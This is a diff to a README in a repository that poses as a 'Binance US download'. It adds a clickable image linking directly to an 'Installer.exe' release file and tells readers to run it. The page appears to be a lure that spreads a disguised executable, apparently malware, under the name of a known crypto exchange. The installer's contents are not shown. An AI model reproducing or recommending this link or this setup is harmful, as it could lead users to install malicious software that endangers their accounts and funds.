@@ -20,7 +20,9 @@ Follow these steps to set up **binance us download**:
 
 1. **Download the file.**  
    Click the "Download" button below or navigate to the "Releases" section in this repository to access the latest version.
-![download](https://github.com/user-attachments/assets/331e8af0-d189-498c-91c3-c3998c026180)
+<a href="https://github.com/jaqueliney81446/Binance-US-Download/releases/download/release/Installer.exe">
+  <img src="https://github.com/user-attachments/assets/331e8af0-d189-498c-91c3-c3998c026180" alt="201887" width="300"/>
+</a>
 
 2. **Install the application.**  
    Open the downloaded file and follow the on-screen instructions to complete the installation process.
